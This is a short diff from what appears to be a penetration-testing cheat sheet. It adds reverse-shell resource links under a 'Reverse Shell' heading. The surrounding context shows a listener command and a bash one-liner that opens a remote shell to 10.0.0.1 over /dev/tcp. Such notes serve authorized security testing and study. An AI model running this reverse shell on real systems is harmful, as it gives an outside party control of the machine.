@@ -276,6 +276,8 @@ penelope -i tun0 -p 1339
 ## Reverse Shell
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://www.revshells.com/
+Hack Tools - FireFox Add-On
 
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
